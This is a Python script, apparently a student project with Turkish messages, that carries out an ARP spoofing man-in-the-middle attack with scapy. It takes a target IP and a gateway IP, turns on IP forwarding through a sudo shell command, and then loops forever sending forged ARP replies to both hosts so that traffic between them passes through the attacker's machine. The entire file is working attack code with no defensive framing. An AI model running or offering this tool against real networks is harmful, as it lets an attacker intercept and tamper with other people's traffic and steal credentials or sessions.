import scapy.all as scapy
import time
import subprocess
import os
import optparse
import sys

def get_mac_address(_ip_range):
	arp_request = scapy.ARP(pdst=_ip_range)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	combined = broadcast/arp_request
	answered_list = scapy.srp(combined, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc


def arp_packet_poisoning(_target_ip, _pretended_ip):

	target_mac = get_mac_address(_target_ip)
	arp_response = scapy.ARP(op=2, pdst=_target_ip, hwdst=target_mac, psrc=_pretended_ip)
	ether = scapy.Ether(dst=target_mac)
	packet = ether / arp_response
	scapy.sendp(packet, verbose=False)


def ip_forwarding():
	
	file_path = "/proc/sys/net/ipv4/ip_forward"

	try:
	    with open(file_path, "r") as f:
	        current_value = f.read().strip()

	    if current_value != "1":
	        subprocess.run(
	            "echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward",
	            shell=True,
	            check=True
	        )
	        print("IP forwarding etkinleştirildi (1 yapıldı).")
	    else:
	        print("IP forwarding zaten etkin (1). Değişiklik yapılmadı.")

	except PermissionError:
	    print("Bu işlem için root yetkisi gerekiyor.")
	except subprocess.CalledProcessError as e:
	    print(f"Hata oluştu: {e}")


parse_object = optparse.OptionParser()
parse_object.add_option("-t", "--target", dest="target_ip", help="Enter target IP")
parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter gateway IP")
options = parse_object.parse_args()[0]

if options.target_ip is None or options.gateway_ip is None:
	print("Eksik ya da hatalı argüman girişi.")
	print("Lütfen tekrar kontrol ediniz ve şu formda olmasına dikkat ediniz:")
	print("python project2.py -t <hedef cihaz id> -g <modem id>")
	sys.exit()

target_ip = options.target_ip
gateway_ip = options.gateway_ip
number = 0

print(f"hedef ip: {target_ip}")
print(f"hedef modem ip: {gateway_ip}")

ip_forwarding()
while True:
	arp_packet_poisoning(target_ip, gateway_ip)
	arp_packet_poisoning(gateway_ip, target_ip)
	number += 2
	print(f"\r{number} adet paket gönderildi.", end="")
	time.sleep(3)